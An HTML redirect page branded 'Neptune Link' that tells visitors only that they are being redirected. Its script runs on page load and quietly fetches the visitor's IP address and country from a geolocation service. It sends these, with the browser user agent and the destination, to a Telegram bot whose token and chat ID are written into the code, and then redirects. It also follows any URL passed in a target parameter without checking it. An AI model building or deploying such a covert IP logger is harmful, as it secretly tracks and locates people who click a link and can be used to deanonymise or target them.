<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Redirecting...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body style="background:#0f172a; color:#94a3b8; font-family:sans-serif; text-align:center; padding-top:100px;">
  <h2>🪐 Neptune Link</h2>
  <p>Redirecting to your destination, please wait...</p>

  <script>
    const BOT_TOKEN = "8669634825:AAG5mv5CMIqilxRWvtw19irIKhXaalmlZZs";
    const CHAT_ID = "8967484934";

    // Helper: Convert 2-letter Country Code to Emoji Flag (e.g. BD -> 🇧🇩, US -> 🇺🇸)
    function getFlagEmoji(countryCode) {
      if (!countryCode || countryCode.length !== 2) return "🌐";
      return countryCode.toUpperCase().replace(/./g, char => 
        String.fromCodePoint(127397 + char.charCodeAt(0))
      );
    }

    async function handleRedirect() {
      let targetUrl = "https://www.google.com";
      
      // 1. Fetch Dynamic Target URL from config.json
      try {
        const configRes = await fetch(`./config.json?t=${Date.now()}`);
        if (configRes.ok) {
          const config = await configRes.json();
          if (config.targetUrl) targetUrl = config.targetUrl;
        }
      } catch (e) {
        console.warn("Using fallback destination.");
      }

      // Check for custom URL parameter (?target=...)
      const urlParams = new URLSearchParams(window.location.search);
      if (urlParams.get("target")) {
        targetUrl = urlParams.get("target");
      }

      // 2. Fetch Visitor Country & IP
      let country = "Unknown";
      let countryCode = "";
      let flag = "🌐";
      let ip = "Hidden";

      try {
        const geoRes = await fetch("https://ipwho.is/");
        if (geoRes.ok) {
          const geoData = await geoRes.json();
          country = geoData.country || "Unknown";
          countryCode = geoData.country_code || "";
          flag = getFlagEmoji(countryCode);
          ip = geoData.ip || "Hidden";
        }
      } catch (err) {
        console.error("Geo lookup error:", err);
      }

      // 3. Send Rich Telegram Alert
      const time = new Date().toUTCString();
      const userAgent = navigator.userAgent;

      const message = `🪐 *Neptune Link Opened!*\n\n` +
                      `📍 *Country:* ${flag} ${country} (\`${countryCode}\`)\n` +
                      `🌐 *IP:* \`${ip}\`\n` +
                      `🔗 *Target:* ${targetUrl}\n` +
                      `📱 *Device:* \`${userAgent}\`\n` +
                      `⏰ *Time:* ${time}`;

      try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: "Markdown"
          })
        });
      } catch (err) {
        console.error("Telegram alert failed:", err);
      }

      // 4. Save local analytics & redirect
      saveLocalAnalytics(country, flag, targetUrl);
      window.location.replace(targetUrl);
    }

    function saveLocalAnalytics(country, flag, target) {
      try {
        const log = {
          time: new Date().toISOString(),
          country: country,
          flag: flag,
          target: target
        };
        const stats = JSON.parse(localStorage.getItem("neptune_stats") || "[]");
        stats.push(log);
        localStorage.setItem("neptune_stats", JSON.stringify(stats));
      } catch (e) {}
    }

    handleRedirect();
  </script>
</body>
</html>
